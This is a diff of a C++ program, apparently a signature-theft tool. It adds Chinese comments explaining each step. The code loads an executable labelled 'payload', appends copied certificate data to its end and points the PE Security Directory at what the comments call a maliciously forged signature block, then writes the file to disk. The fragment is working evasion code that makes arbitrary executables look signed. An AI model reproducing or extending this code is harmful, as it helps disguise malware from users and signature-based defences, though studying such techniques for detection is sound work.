@@ -51,19 +51,22 @@ int main(int argc, char **argv) {
 
 	// payload data prepare.
 	LONGLONG payloadSize = 0;
+	// 讀入欲套上簽名的 PE 程式檔案，作為 payload
 	BYTE *payloadPeData = MapFileToMemory(argv[2], payloadSize);
 
 	// append signature to payload.
-	// 準備一份
+	// 準備一份足夠的空間(finalPeData)儲存 payload 簽名訊息
 	BYTE *finalPeData = new BYTE[payloadSize + certSize];
 	memcpy(finalPeData, payloadPeData, payloadSize);
 
+	// 將拷貝過來的簽名訊息拼貼在原始程式內容末端，並使其 Security Directory 指向到惡意偽造的簽名訊息塊上
 	auto ntHdr = PIMAGE_NT_HEADERS(&finalPeData[PIMAGE_DOS_HEADER(finalPeData)->e_lfanew]);
 	ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = payloadSize;
 	ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certSize;
 	memcpy(&finalPeData[payloadSize], certData, certSize);
 
 	FILE *fp = fopen(argv[3], "wb");
+	// 以 fwrite 將為 PE 檔案輸出到磁碟槽上
 	fwrite(finalPeData, payloadSize + certSize, 1, fp);
 	puts("done.");
 }
